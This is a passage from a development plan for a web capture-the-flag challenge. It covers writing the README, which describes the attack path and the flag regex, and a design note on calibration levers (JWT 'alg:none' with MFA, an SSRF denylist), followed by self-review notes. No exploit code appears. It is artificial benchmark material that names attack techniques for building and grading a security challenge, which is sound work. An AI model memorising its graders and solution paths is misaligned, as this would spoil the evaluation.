git commit -m "feat: calibration harness and measured reliability + solve-time report"
```

---

### Task 12: README and design note

**Files:**
- Create: `README.md`
- Create: `design-note.md`

**Interfaces:**
- Produces: the top-level documentation the graders read first.

- [ ] **Step 1: Write `README.md`**

Include, in order: one-line pitch; category (web) and why it is representative; the exact single build/run command (`docker compose up --build`); the flag format and grader regex `flag\{[a-z0-9_]+\}`; the intended attack path (the five stages with their breadcrumbs); how to run the reference solution (`BASE_URL=http://localhost:8080 python solution/solve.py`); how to grade a transcript (`python rubric/grader.py < transcript.txt`); and the calibration report (reliability count, solve time, difficulty-band reasoning) copied from `calibration/results.md`.

- [ ] **Step 2: Write `design-note.md` (one page max)**

Cover the key decisions and trade-offs: why web and this chain; why breadcrumb tokens make the rewards machine-checkable and monotonic; the two calibration levers (`alg:none`+MFA, SSRF denylist) and how they keep the task off the trivial floor; and what you would improve with more time (real-agent calibration rollouts, a second admin-escalation path for variety, randomized per-instance breadcrumbs/flag to resist memorization).

- [ ] **Step 3: Verify the whole suite is green and the container solves clean**

Run: `.venv/Scripts/pytest -q`
Expected: all tests pass.
Run: `docker compose up --build -d && BASE_URL=http://localhost:8080 python solution/solve.py`
Expected: prints the flag; exit 0.

- [ ] **Step 4: Commit**

```bash
git add README.md design-note.md
git commit -m "docs: README with attack path and calibration, plus one-page design note"
```

---

## Self-Review Notes

- **Spec coverage:** category+justification (Task 12, README), runnable single-command env (Task 8), reference solution (Task 10), staged JSON rubric (Task 9), README/design-note (Task 12), flag regex (global + Tasks 2/9), calibration (Task 11). All spec sections map to a task.
- **Type consistency:** `create_app`, `create_engine_app`, `issue_token`, `verify_token`, `admin_gate`, `score_transcript`, `solve` names are used identically across tasks. Breadcrumb constants are byte-identical everywhere.
- **Review Focus:** each of the five listed failure modes has a test in Task 4, 5, or 6.
- **Placeholder scan:** every code step contains runnable content; prose-only steps (walkthrough, README, design-note, results) are documentation deliverables with explicit required contents.
